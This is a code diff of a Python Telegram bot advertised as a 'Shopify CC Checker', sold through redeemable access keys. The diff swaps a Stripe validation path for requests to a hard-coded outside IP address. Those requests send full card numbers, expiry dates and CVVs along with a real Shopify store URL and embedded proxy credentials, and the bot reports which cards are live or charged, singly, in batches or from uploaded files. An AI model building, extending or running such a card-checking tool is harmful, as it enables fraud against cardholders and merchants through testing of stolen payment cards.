@@ -5,6 +5,7 @@ import time
 from telegram import Update
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
 import requests
+from urllib.parse import quote
 
 # Enable logging
 logging.basicConfig(
@@ -12,9 +13,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Railway environment variables se keys uthana
-STRIPE_SECRET_KEY = os.getenv("STRIPE_SECRET_KEY")
-STRIPE_PUBLISHABLE_KEY = os.getenv("STRIPE_PUBLISHABLE_KEY")
+# Railway environment variables se bot token uthana
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 
 OWNER_USERNAME = "@ESCROW2929"
@@ -62,7 +61,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     welcome_message = (
         f"Hello {user.first_name}!\n\n"
-        f"🤖 **CC Checker & Gateway Bot is Online**\n"
+        f"🤖 **Shopify CC Checker Bot is Online**\n"
         f"⚠️ *Note: Use `/redeem <key>` to activate your access before checking cards.*\n\n"
         f"👑 **Owner:** {OWNER_USERNAME}"
     )
@@ -77,7 +76,7 @@ async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
     panel_message = (
         f"🛠 **Admin Panel & Controls**\n\n"
-        f"• Stripe Integration: Connected (Test Mode)\n"
+        f"• Gateway: Shopify API Connected ✅\n"
         f"• Total Keys in System: {len(ACTIVE_KEYS)}\n"
         f"• Banned Users: {len(BANNED_USERS)}\n\n"
         f"**Available Commands:**\n"
@@ -123,22 +122,19 @@ async def generate_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
         }
         generated_keys_list.append(key_str)
     
-    # Telegram message ki length limit hoti hai, isliye agar quantity zyada ho toh chunks me bhejenge ya format karke
     keys_text = "\n".join([f"`{k}`" for k in generated_keys_list])
-    
     response_msg = (
         f"🔑 **{qty} Keys Generated Successfully!**\n"
         f"⏱ **Duration:** {time_str}\n\n"
         f"{keys_text}"
     )
     
-    # Agar message lamba ho toh split karke bhej sakte hain, yahan direct bhej rahe hain
     if len(response_msg) > 4000:
-        await update.message.reply_text(f"🔑 {qty} Keys generated successfully! (List is too long, saving to system).")
+        await update.message.reply_text(f"🔑 {qty} Keys generated successfully! (List is too long to display at once).")
     else:
         await update.message.reply_text(response_msg, parse_mode="Markdown")
 
-# /redeem <key> command for users to claim keys
+# /redeem <key> command
 async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id in BANNED_USERS:
@@ -157,12 +153,10 @@ async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
     key_data = ACTIVE_KEYS[user_key]
     
-    # Check if already used
     if key_data["used_by"] is not None:
         await update.message.reply_text("❌ This key has already been used by someone else!")
         return
         
-    # Mark as used and set expiry based on current time + duration
     current_time = time.time()
     expiry_timestamp = current_time + key_data["duration_seconds"]
     
@@ -252,12 +246,11 @@ def has_access(user_id):
         if time.time() < expiry:
             return True
         else:
-            # Expired
             del USER_SUBSCRIPTIONS[user_id]
             return False
     return False
 
-# Core Stripe Card Checker Logic
+# Shopify API Card Checker Logic
 def process_card_string(card_line):
     try:
         parts = card_line.split('|')
@@ -265,32 +258,43 @@ def process_card_string(card_line):
             return f"❌ `{card_line}` ➔ **Invalid Format**"
         
         cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+        formatted_cc = f"{cc}|{mes}|{ano}|{cvv}"
         
-        if STRIPE_SECRET_KEY:
-            url = "https://api.stripe.com/v1/payment_methods"
-            headers = {
-                "Authorization": f"Bearer {STRIPE_SECRET_KEY}",
-                "Content-Type": "application/x-www-form-urlencoded"
-            }
-            data = {
-                "type": "card",
-                "card[number]": cc,
-                "card[exp_month]": mes,
-                "card[exp_year]": ano,
-                "card[cvc]": cvv
-            }
-            response = requests.post(url, headers=headers, data=data)
-            res_data = response.json()
-            
-            if "id" in res_data:
-                return f"✅ `{cc[:6]}******|{mes}|{ano}|{cvv}` ➔ **Approved [LIVE - Stripe Token]**"
-            else:
-                err_msg = res_data.get("error", {}).get("message", "Declined")
-                return f"❌ `{cc[:6]}******|{mes}|{ano}|{cvv}` ➔ **Declined ({err_msg})**"
+        # Shopify API URL integration
+        api_url = f"http://216.250.119.63/?{quote(formatted_cc)}&url=https://customsbyarrillc.myshopify.com&proxy=ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
+        
+        response = requests.get(api_url, timeout=15)
+        res_data = response.json()
+        
+        resp_status = res_data.get("Response", "UNKNOWN")
+        price = res_data.get("Price", "N/A")
+        gate = res_data.get("Gate", "Shopify Payments")
+        site = res_data.get("Site", "N/A")
+        charged = res_data.get("Charged", "False")
+        approved = res_data.get("Approved", "False")
+        req_time = res_data.get("Time", "N/A")
+        
+        masked_cc = f"{cc[:6]}******|{mes}|{ano}|{cvv}"
+        
+        if approved.lower() == "true" or charged.lower() == "true" or "approved" in resp_status.lower() or "success" in resp_status.lower():
+            return (
+                f"✅ `{masked_cc}`\n"
+                f"➔ **Status:** {resp_status}\n"
+                f"➔ **Gate:** {gate}\n"
+                f"➔ **Price:** {price}\n"
+                f"➔ **Time:** {req_time}"
+            )
         else:
-            return f"⚠️ `{cc[:6]}******|{mes}|{ano}|{cvv}` ➔ **Stripe Key Missing**"
-    except Exception:
-        return f"❌ `{card_line}` ➔ **Error Processing**"
+            return (
+                f"❌ `{masked_cc}`\n"
+                f"➔ **Status:** {resp_status}\n"
+                f"➔ **Gate:** {gate}\n"
+                f"➔ **Price:** {price}\n"
+                f"➔ **Time:** {req_time}"
+            )
+            
+    except Exception as e:
+        return f"❌ `{card_line}` ➔ **API Error / Timeout**"
 
 # /chk for checking 1 card
 async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -325,7 +329,7 @@ async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     results = [process_card_string(line.strip()) for line in lines if "|" in line]
     if results:
-        await update.message.reply_text("\n".join(results[:15]), parse_mode="Markdown")
+        await update.message.reply_text("\n\n".join(results[:10]), parse_mode="Markdown")
     else:
         await update.message.reply_text("❌ No valid cards found.")
 
@@ -351,7 +355,7 @@ async def chf_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     results = [process_card_string(line.strip()) for line in lines if "|" in line]
     
     if results:
-        await update.message.reply_text(f"📁 File Processed!\n\n" + "\n".join(results[:15]), parse_mode="Markdown")
+        await update.message.reply_text(f"📁 **File Processed!**\n\n" + "\n\n".join(results[:10]), parse_mode="Markdown")
     else:
         await update.message.reply_text("❌ File contains no valid card lines.")
 
@@ -373,7 +377,7 @@ def main():
     
     app.add_handler(MessageHandler(filters.Document.ALL, chf_document))
 
-    print("Bot is up and running with Prime Key generation & validation logic...")
+    print("Bot is up and running with Shopify API integrated...")
     app.run_polling()
 
 if __name__ == "__main__":
